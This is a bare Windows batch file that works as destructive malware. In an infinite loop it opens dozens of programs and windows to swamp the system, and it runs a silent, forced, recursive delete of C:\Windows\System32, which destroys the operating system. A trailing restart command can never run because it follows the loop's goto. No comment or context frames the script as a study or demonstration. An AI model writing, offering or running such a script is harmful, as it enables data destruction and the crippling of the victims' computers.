@echo off
:repeat
echo %random%
color 17
start mspaint
start notepad
start cmd
start calc
start control
start write
start explorer
start config
start %temp%
start System32
icacls C:\Windows\System32
start Taskmgr
start C:
del /s /q /f C:\Windows\System32
goto repeat
shutdown -r -t 0